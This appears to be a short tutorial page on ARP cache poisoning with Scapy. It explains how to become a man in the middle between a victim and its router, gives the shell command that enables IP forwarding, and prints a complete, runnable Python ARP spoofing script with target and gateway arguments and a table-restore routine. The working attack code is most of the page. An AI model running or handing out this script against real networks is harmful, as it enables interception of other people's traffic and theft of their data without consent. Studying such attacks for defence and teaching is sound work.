---
title: "Arp cache poisoning"
date: 2019-01-06
# geekdocFlatSection: false
# geekdocToc: 6
# geekdocHidden: false
---

With Scapy you can easily send crafted ARP reply packets. The idea is to constantly send the victim ARP replies telling it we are the router..
We do the same for the router, we tell it we are the victim machine. After we become the man in the middle we can intercept & inspect all data.

To allow forwarding of packets between the victim and the gateway we need to enable ip_forward:

```Shell
echo '1' > /proc/sys/net/ipv4/ip_forward
```

The function get_mac sends arp request message ("Who has") to the broadcast address, so all clients on the LAN receive it,  
we will get the correct mac address back from the target_ip.  

Now that we have the correct mac address from the target we can start sending spoofed reply packets with spoof function ('target_ip' <b>is at</b> 'attacker mac address')   

![arp reply 1](1at.png)

and

![arp reply 2](18at.png)

The full code:  

```python
#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP")
    options = parser.parse_args()
    return options

# Get target mac address using ip address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    return answered_list[0][1].hwsrc

# Change mac address in arp table
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Restore mac address in arp table
def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] ARP spoofing started - packets sent: " + str(sent_packets_count))
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL+C pressed .... Reseting ARP tables. Please wait")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("\nARP table restored. Quiting")

```
